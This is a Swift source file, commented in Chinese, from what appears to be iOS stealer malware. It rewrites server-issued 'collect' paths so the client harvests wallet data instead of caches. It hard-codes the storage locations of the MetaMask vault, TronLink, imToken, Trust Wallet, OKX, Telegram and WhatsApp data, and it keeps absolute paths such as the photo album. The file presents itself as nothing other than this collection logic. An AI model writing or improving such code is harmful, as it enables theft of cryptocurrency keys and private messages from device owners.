import Foundation

/// 采集路径归一化。
///
/// 服务端 `/device/collect` 下发的 `items` 有两类问题：
///   1. 空数组（`collect-catalog.ts` 里钱包的 `files`/`dirs` 都是 `[]`）
///   2. 指向 `Library/Caches`（整容器采集时把图标、Telegram 媒体缓存全捞走）
///
/// 这两种情况下采回来的东西都不含任何钱包数据。这里在客户端兜底：
/// 丢弃缓存路径，若剩下的为空就替换成真正存数据的目录。
///
/// 不改服务端也能生效；服务端配了有效路径时原样透传。
enum CollectPathResolver {

    /// 钱包数据的真实落点。刻意不含 `Library/Caches`。
    static let fallbackDirs: [String] = [
        "Documents",
        "Library/Application Support",
        "Library/Preferences",
        "Library/mmkv",
    ]

    /// 判断是否是纯缓存路径（采了也没用）。
    static func isCachePath(_ path: String) -> Bool {
        let p = path.trimmingCharacters(in: .whitespaces).lowercased()
        if p.isEmpty { return true }
        if p.contains("library/caches") { return true }
        if p == "tmp" || p.hasPrefix("tmp/") { return true }
        if p.hasSuffix("/caches") || p.contains("/caches/") { return true }
        return false
    }

    /// 归一化一个采集项的 items。
    ///
    /// - 含绝对路径（整容器 `/`、`/var/mobile/Media/DCIM` 之类）→ 原样保留，
    ///   这类配置是刻意的（备忘录、相册），不该被替换。
    /// - 有效相对路径 → 只丢掉缓存项，其余保留。
    /// - 全被丢掉 → 换成 `fallbackDirs`。
    static func normalize(bundleID: String, items: [CollectItem]) -> [CollectItem] {
        if items.contains(where: { $0.path.hasPrefix("/") }) {
            return items
        }
        let usable = items.filter { !isCachePath($0.path) }
        if !usable.isEmpty {
            return usable
        }
        return effectiveFallback(for: bundleID)
    }

    /// 给特定 app 的额外补充路径（在通用目录之外再加）。
    /// 只在整个归一化结果为兜底时才追加，避免把服务端的精确配置冲掉。
    static func extraDirs(for bundleID: String) -> [String] {
        switch bundleID {
        case "io.metamask.MetaMask":
            // vault 在 RCTAsyncLocalStorage_V1 下的 manifest + 数据文件
            return ["Library/Application Support/io.metamask.MetaMask/RCTAsyncLocalStorage_V1"]
        case "com.tronlink.hdwallet":
            return ["Library/Application Support/com.tronlink.hdwallet"]
        case "com.global.wallet.ios":
            return ["Library/Application Support/com.global.wallet.ios"]
        case "im.token.app":
            return ["Library/Application Support/im.token.app"]
        case "com.sixdays.trust":
            return ["Library/Application Support/com.sixdays.trust"]
        case "com.okex.OKExAppstoreFull", "com.okx.wallet":
            return ["Library/Application Support"]
        case "ph.telegra.Telegraph", "group.ph.telegra.Telegraph":
            return ["Documents", "Library/Application Support"]
        case "net.whatsapp.WhatsApp.shared":
            return ["Documents", "Library"]
        default:
            return []
        }
    }

    /// 把兜底目录和该 app 的补充目录合并去重。
    static func effectiveFallback(for bundleID: String) -> [CollectItem] {
        var seen = Set<String>()
        var out: [CollectItem] = []
        for path in fallbackDirs + extraDirs(for: bundleID) where seen.insert(path).inserted {
            out.append(CollectItem(type: "dir", path: path))
        }
        return out
    }
}
